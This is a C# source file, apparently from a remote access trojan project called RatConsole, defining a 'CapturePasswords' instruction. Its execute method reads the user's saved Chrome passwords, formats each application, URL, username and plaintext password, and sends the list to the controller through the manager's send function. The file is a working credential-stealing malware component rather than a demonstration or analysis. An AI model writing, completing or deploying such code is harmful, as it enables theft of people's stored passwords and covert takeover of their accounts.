using System;

using Bau.Libraries.LibMarkupLanguage;

namespace RatConsole.Domain
{
	/// <summary>
	///		Instrucción para obtener las contraseñas del usuario
	/// </summary>
	public class CapturePasswordsInstructionModel : BaseInstructionModel
	{
		// Constantes públicas
		public const string TagRoot = "CapturePasswords";

		public CapturePasswordsInstructionModel(Controllers.ProgramManager manager) : base(manager) {}

		/// <summary>
		///		Interpreta el nodo
		/// </summary>
		public override BaseInstructionModel Parse(MLNode nodeML)
		{
			// Interpreta los datos básicos
			ParseInternal(nodeML);
			// Devuelve la instrucción interpretada
			return this;
		}

		/// <summary>
		///		Ejecuta la instrucción
		/// </summary>
		protected override void ExecuteInternal()
		{
			System.Text.StringBuilder builder = new System.Text.StringBuilder();

				// Log
				Manager.Log($"Ejecutando la captura de contraseñas");
				// Guarda las contraseñas de los usuarios
				foreach (Models.UserModel user in new Services.Passwords.ChromePasswordReader().GetPasswords())
					builder.AppendLine($"Aplicación: {user.Application} - Url: {user.Url} - Usuario: {user.User} - Contraseña: {user.Password}");
				// y los envía
				Manager.SendText(builder.ToString());
				// Log
				Manager.Log($"Fin de ejecución de la captura de contraseñas");
		}

		/// <summary>
		///		Obtiene los datos del nodo
		/// </summary>
		public override MLNode GetMLNode()
		{
			return GetMLNodeInternal(TagRoot);
		}
	}
}
